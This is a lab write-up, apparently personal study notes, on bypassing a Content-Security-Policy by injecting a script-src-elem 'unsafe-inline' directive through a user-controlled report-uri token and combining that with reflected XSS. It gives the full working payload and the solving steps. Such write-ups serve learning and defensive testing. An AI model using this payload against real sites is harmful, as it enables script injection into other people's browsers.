---
title: 30_Lab-Reflected XSS protected by CSP, with CSP bypass
date: 2026-07-17
tags:
  - 
publish: true
draft: false
description: ""
---

---

This lab uses CSP and contains a reflected XSS vulnerability.

To solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the `alert` function.

Please note that the intended solution to this lab is only possible in Chrome

---

The page has a strict CSP header like:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

This means:

```
'self' only    → only scripts from same origin allowed
no inline JS   → <script>alert(1)</script> blocked by CSP
no eval        → eval() blocked
no data: URIs  → data: scheme blocked
```

So even if you inject a `<script>` tag, CSP blocks it from executing.

---

## The Vulnerability — CSP with a `script-src` Nonce BUT with a Bypassable Directive

The actual CSP in this lab looks like:

```
Content-Security-Policy: default-src 'self'; 
                         script-src 'self' 'nonce-RANDOMVALUE';
                         report-uri /csp-report?token=
```

Three critical things to notice:

```
1. script-src has a nonce       → inline scripts need the nonce to execute
2. report-uri is present        → CSP violations are reported somewhere
3. report-uri has a token param → this token parameter is user controllable
```

---

## The Key Insight — `report-uri` Injection

The `report-uri` directive in the CSP header contains a URL parameter that **you control via the search input**:

```
Your search input: hello
CSP header becomes:
Content-Security-Policy: ...report-uri /csp-report?token=hello
```

You can **inject into the CSP header itself** by injecting into the `token` parameter. This is a **header injection** vulnerability in the CSP directive.

---

## What You Can Inject Into CSP

Since you control what comes after `token=` in the CSP header, you can inject additional CSP directives by using a semicolon:

```
Search input: hello;script-src-elem 'unsafe-inline'

CSP becomes:
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz'; 
report-uri /csp-report?token=hello;script-src-elem 'unsafe-inline'
```

Now the CSP contains `script-src-elem 'unsafe-inline'` which **overrides the script-src directive** for script elements specifically — allowing inline scripts to execute.

---

## Why `script-src-elem` Overrides `script-src`

```
script-src          → applies to all script resources (broad)
script-src-elem     → applies specifically to <script> elements (specific)

When both present:
  script-src-elem takes PRECEDENCE over script-src for <script> elements
  So 'unsafe-inline' in script-src-elem allows inline scripts
  Even though script-src doesn't have 'unsafe-inline'
```

---

## The Full Payload

In the search box inject:

```
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

Breaking it down:

```
<script>alert(1)</script>   → the XSS payload injected into page HTML
&token=                     → separates into URL parameter
;script-src-elem 'unsafe-inline'  → injected into CSP header via report-uri token
```

What happens:

```
HTML response contains:
<script>alert(1)</script>    ← your injected script tag

CSP header becomes:
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz';
report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
                                             ↑
                              your injection adds this directive

Browser evaluates CSP:
script-src-elem 'unsafe-inline' → inline scripts allowed ✅
<script>alert(1)</script> → executes ✅
```

---

## Step by Step — How to Solve the Lab

### Step 1 — Confirm XSS Reflection

Search for `<h1>test</h1>` and check if it appears in the page — confirms HTML injection works but CSP blocks script execution.

### Step 2 — Check the CSP Header

In Network tab → Response Headers:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...'; report-uri /csp-report?token=
```

Notice `token=` at the end — your search term goes here.

### Step 3 — Test Header Injection

Search for:

```
test;script-src-elem 'unsafe-inline'
```

Check response CSP header — confirm your injection appears after `token=`.

### Step 4 — Combine XSS + CSP Bypass

Final payload in search box:

```
<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

Or URL encoded in the address bar:

```
?search=<script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
```

---

## Why This Works — The Complete Chain

```
Two separate injections happening simultaneously:

Injection 1: Into HTML body (XSS)
  ?search=<script>alert(1)</script>
  → script tag appears in page HTML
  → normally blocked by CSP

Injection 2: Into CSP header (CSP bypass)
  &token=;script-src-elem 'unsafe-inline'
  → CSP header gets new directive
  → inline scripts now allowed

Combined effect:
  Script tag present in HTML ✅
  CSP now allows inline scripts ✅
  alert(1) executes ✅
```

---

## The Core Concept This Lab Teaches

```
CSP is only as strong as its own configuration pipeline.

If any part of the CSP header value is user-controllable:
  → attacker can inject new directives
  → attacker can weaken the policy
  → CSP protection completely defeated

The irony:
  report-uri exists to REPORT CSP violations
  But if report-uri contains user input
  The user can inject directives that DISABLE CSP
  Making the security feature defeat itself
```

---

## Key Takeaways for Your Notes

```
1. Always check if ANY URL parameter appears in CSP header
2. report-uri token= is a classic injection point
3. script-src-elem overrides script-src for inline scripts
4. CSP header injection = complete CSP bypass
5. XSS + CSP bypass must be combined as one payload
   (two separate URL parameters in same request)
```